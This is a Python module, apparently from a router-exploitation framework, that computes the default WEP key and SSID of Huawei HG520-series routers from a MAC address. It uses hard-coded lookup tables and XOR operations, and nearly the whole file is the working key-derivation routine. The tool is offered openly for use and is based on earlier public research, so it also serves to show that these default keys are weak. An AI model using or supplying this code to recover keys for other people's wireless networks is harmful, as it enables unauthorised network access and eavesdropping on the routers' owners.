# Name:Huawei HG520 mac2wepkey
# File:hg520_mac2wep.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 14.6.2015
# Last modified: 14.6.2015
# Shodan Dork:
# Description: Generates WEP Key for Huawei HG5XX based on mac.
# Based on work by humberto121@websec.mx - 12/2010

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac


class Misc(core.Misc.RextMisc):
    """
Name:Huawei HG520 mac2wepkey
File:hg520_mac2wep.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 14.6.2015
Description: Generates WEP Key for Huawei HG5XX based on mac.
Based on: Work by humberto121@websec.mx - 12/2010

Options:
    Name        Description

    mac         MAC address used as input for WEP password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.replace(":", "")
        mac = mac.replace("-", "")
        mac_array = [0]*12
        i = 0
        for number in mac:
            mac_array[i] = int(number, 16)
            i += 1

        a0 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        a1 = [0,  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
        a2 = [0, 13, 10, 7, 5, 8, 15, 2, 10, 7, 0, 13, 15, 2, 5, 8]
        a3 = [0, 1, 3, 2, 7, 6, 4, 5, 15, 14, 12, 13, 8, 9, 11, 10]
        a4 = [0, 5, 11, 14, 7, 2, 12, 9, 15, 10, 4, 1, 8, 13, 3, 6]
        a5 = [0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12]
        a6 = [0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8]
        a7 = [0, 8, 0, 8, 1, 9, 1, 9, 2, 10, 2, 10, 3, 11, 3, 11]
        a8 = [0, 5, 11, 14, 6, 3, 13, 8, 12, 9, 7, 2, 10, 15, 1, 4]
        a9 = [0, 9, 2, 11, 5, 12, 7, 14, 10, 3, 8, 1, 15, 6, 13, 4]
        a10 = [0, 14, 13, 3, 11, 5, 6, 8, 6, 8, 11, 5, 13, 3, 0, 1, 4]
        a11 = [0, 12, 8, 4, 1, 13, 9, 5, 2, 14, 10, 6, 3, 15, 11, 7]
        a12 = [0, 4, 9, 13, 2, 6, 11, 15, 4, 0, 13, 9, 6, 2, 15, 11]
        a13 = [0, 8, 1, 9, 3, 11, 2, 10, 6, 14, 7, 15, 5, 13, 4, 12]
        a14 = [0, 1, 3, 2, 7, 6, 4, 5, 14, 15, 13, 12, 9, 8, 10, 11]
        a15 = [0, 1, 3, 2, 6, 7, 5, 4, 13, 12, 14, 15, 11, 10, 8, 9]
        n1 = [0, 14, 10, 4, 8, 6, 2, 12, 0, 14, 10, 4, 8, 6, 2, 12]
        n2 = [0, 8, 0, 8, 3, 11, 3, 11, 6, 14, 6, 14, 5, 13, 5, 13]
        n3 = [0, 0, 3, 3, 2, 2, 1, 1, 4, 4, 7, 7, 6, 6, 5, 5]
        n4 = [0, 11, 12, 7, 15, 4, 3, 8, 14, 5, 2, 9, 1, 10, 13, 6]
        n5 = [0, 5, 1, 4, 6, 3, 7, 2, 12, 9, 13, 8, 10, 15, 11, 14]
        n6 = [0, 14, 4, 10, 11, 5, 15, 1, 6, 8, 2, 12, 13, 3, 9, 7]
        n7 = [0, 9, 0, 9, 5, 12, 5, 12, 10, 3, 10, 3, 15, 6, 15, 6]
        n8 = [0, 5, 11, 14, 2, 7, 9, 12, 12, 9, 7, 2, 14, 11, 5, 0]
        n9 = [0, 0, 0, 0, 4, 4, 4, 4, 0, 0, 0, 0, 4, 4, 4, 4]
        n10 = [0, 8, 1, 9, 3, 11, 2, 10, 5, 13, 4, 12, 6, 14, 7, 15]
        n11 = [0, 14, 13, 3, 9, 7, 4, 10, 6, 8, 11, 5, 15, 1, 2, 12]
        n12 = [0, 13, 10, 7, 4, 9, 14, 3, 10, 7, 0, 13, 14, 3, 4, 9]
        n13 = [0, 1, 3, 2, 6, 7, 5, 4, 15, 14, 12, 13, 9, 8, 10, 11]
        n14 = [0, 1, 3, 2, 4, 5, 7, 6, 12, 13, 15, 14, 8, 9, 11, 10]
        n15 = [0, 6, 12, 10, 9, 15, 5, 3, 2, 4, 14, 8, 11, 13, 7, 1]
        n16 = [0, 11, 6, 13, 13, 6, 11, 0, 11, 0, 13, 6, 6, 13, 0, 11]
        n17 = [0, 12, 8, 4, 1, 13, 9, 5, 3, 15, 11, 7, 2, 14, 10, 6]
        n18 = [0, 12, 9, 5, 2, 14, 11, 7, 5, 9, 12, 0, 7, 11, 14, 2]
        n19 = [0, 6, 13, 11, 10, 12, 7, 1, 5, 3, 8, 14, 15, 9, 2, 4]
        n20 = [0, 9, 3, 10, 7, 14, 4, 13, 14, 7, 13, 4, 9, 0, 10, 3]
        n21 = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15]
        n22 = [0, 1, 2, 3, 5, 4, 7, 6, 11, 10, 9, 8, 14, 15, 12, 13]
        n23 = [0, 7, 15, 8, 14, 9, 1, 6, 12, 11, 3, 4, 2, 5, 13, 10]
        n24 = [0, 5, 10, 15, 4, 1, 14, 11, 8, 13, 2, 7, 12, 9, 6, 3]
        n25 = [0, 11, 6, 13, 13, 6, 11, 0, 10, 1, 12, 7, 7, 12, 1, 10]
        n26 = [0, 13, 10, 7, 4, 9, 14, 3, 8, 5, 2, 15, 12, 1, 6, 11]
        n27 = [0, 4, 9, 13, 2, 6, 11, 15, 5, 1, 12, 8, 7, 3, 14, 10]
        n28 = [0, 14, 12, 2, 8, 6, 4, 10, 0, 14, 12, 2, 8, 6, 4, 10]
        n29 = [0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3]
        n30 = [0, 15, 14, 1, 12, 3, 2, 13, 8, 7, 6, 9, 4, 11, 10, 5]
        n31 = [0, 10, 4, 14, 9, 3, 13, 7, 2, 8, 6, 12, 11, 1, 15, 5]
        n32 = [0, 10, 5, 15, 11, 1, 14, 4, 6, 12, 3, 9, 13, 7, 8, 2]
        n33 = [0, 4, 9, 13, 3, 7, 10, 14, 7, 3, 14, 10, 4, 0, 13, 9]
        key = [30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 62, 63, 64, 65, 66]
        ssid = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f']
            
        s1 = (n1[mac_array[0]]) ^ (a4[mac_array[1]]) ^ (a6[mac_array[2]]) ^ (a1[mac_array[3]]) ^ \
            (a11[mac_array[4]]) ^ (n20[mac_array[5]]) ^ (a10[mac_array[6]]) ^ (a4[mac_array[7]]) ^ \
            (a8[mac_array[8]]) ^ (a2[mac_array[9]]) ^ (a5[mac_array[10]]) ^ (a9[mac_array[11]]) ^ 5
        
        s2 = (n2[mac_array[0]]) ^ (n8[mac_array[1]]) ^ (n15[mac_array[2]]) ^ (n17[mac_array[3]]) ^ \
            (a12[mac_array[4]]) ^ (n21[mac_array[5]]) ^ (n24[mac_array[6]]) ^ (a9[mac_array[7]]) ^ \
            (n27[mac_array[8]]) ^ (n29[mac_array[9]]) ^ (a11[mac_array[10]]) ^ (n32[mac_array[11]]) ^ 10
        
        s3 = (n3[mac_array[0]]) ^ (n9[mac_array[1]]) ^ (a5[mac_array[2]]) ^ (a9[mac_array[3]]) ^ \
            (n19[mac_array[4]]) ^ (n22[mac_array[5]]) ^ (a12[mac_array[6]]) ^ (n25[mac_array[7]]) ^ \
            (a11[mac_array[8]]) ^ (a13[mac_array[9]]) ^ (n30[mac_array[10]]) ^ (n33[mac_array[11]]) ^ 11
        
        s4 = (n4[mac_array[0]]) ^ (n10[mac_array[1]]) ^ (n16[mac_array[2]]) ^ (n18[mac_array[3]]) ^ \
            (a13[mac_array[4]]) ^ (n23[mac_array[5]]) ^ (a1[mac_array[6]]) ^ (n26[mac_array[7]]) ^ \
            (n28[mac_array[8]]) ^ (a3[mac_array[9]]) ^ (a6[mac_array[10]]) ^ (a0[mac_array[11]]) ^ 10
        
        ya = (a2[mac_array[0]]) ^ (n11[mac_array[1]]) ^ (a7[mac_array[2]]) ^ (a8[mac_array[3]]) ^ \
            (a14[mac_array[4]]) ^ (a5[mac_array[5]]) ^ (a5[mac_array[6]]) ^ (a2[mac_array[7]]) ^ \
            (a0[mac_array[8]]) ^ (a1[mac_array[9]]) ^ (a15[mac_array[10]]) ^ (a0[mac_array[11]]) ^ 13
        
        yb = (n5[mac_array[0]]) ^ (n12[mac_array[1]]) ^ (a5[mac_array[2]]) ^ (a7[mac_array[3]]) ^ \
            (a2[mac_array[4]]) ^ (a14[mac_array[5]]) ^ (a1[mac_array[6]]) ^ (a5[mac_array[7]]) ^ \
            (a0[mac_array[8]]) ^ (a0[mac_array[9]]) ^ (n31[mac_array[10]]) ^ (a15[mac_array[11]]) ^ 4
        
        yc = (a3[mac_array[0]]) ^ (a5[mac_array[1]]) ^ (a2[mac_array[2]]) ^ (a10[mac_array[3]]) ^ \
            (a7[mac_array[4]]) ^ (a8[mac_array[5]]) ^ (a14[mac_array[6]]) ^ (a5[mac_array[7]]) ^ \
            (a5[mac_array[8]]) ^ (a2[mac_array[9]]) ^ (a0[mac_array[10]]) ^ (a1[mac_array[11]]) ^ 7
        
        yd = (n6[mac_array[0]]) ^ (n13[mac_array[1]]) ^ (a8[mac_array[2]]) ^ (a2[mac_array[3]]) ^ \
            (a5[mac_array[4]]) ^ (a7[mac_array[5]]) ^ (a2[mac_array[6]]) ^ (a14[mac_array[7]]) ^ \
            (a1[mac_array[8]]) ^ (a5[mac_array[9]]) ^ (a0[mac_array[10]]) ^ (a0[mac_array[11]]) ^ 14
        
        ye = (n7[mac_array[0]]) ^ (n14[mac_array[1]]) ^ (a3[mac_array[2]]) ^ (a5[mac_array[3]]) ^ \
            (a2[mac_array[4]]) ^ (a10[mac_array[5]]) ^ (a7[mac_array[6]]) ^ (a8[mac_array[7]]) ^ \
            (a14[mac_array[8]]) ^ (a5[mac_array[9]]) ^ (a5[mac_array[10]]) ^ (a2[mac_array[11]]) ^ 7

        key_string = str(key[ya]) + str(key[yb]) + str(key[yc]) + str(key[yd]) + str(key[ye])
        ssid_string = str(ssid[s1]) + str(ssid[s2]) + str(ssid[s3]) + str(ssid[s4])

        print_success("WEP key generated")
        print("SSID:" + ssid_string)
        print("WEP Key:" + key_string)

Misc()
